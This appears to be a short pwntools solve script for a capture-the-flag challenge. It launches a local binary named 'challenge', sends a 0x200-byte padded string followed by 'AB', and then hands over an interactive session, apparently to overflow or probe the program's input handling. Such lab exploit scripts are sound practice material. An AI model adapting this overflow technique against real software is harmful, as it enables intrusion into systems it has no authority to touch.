from pwn import process, context
from time import sleep

context.log_level = 'debug'
r = process("./challenge")

'''
0x100c
'''

payload = "ouo"

payload += "o" * (0x200 - len(payload))

r.sendline(payload)

r.send("AB\n")
r.interactive()

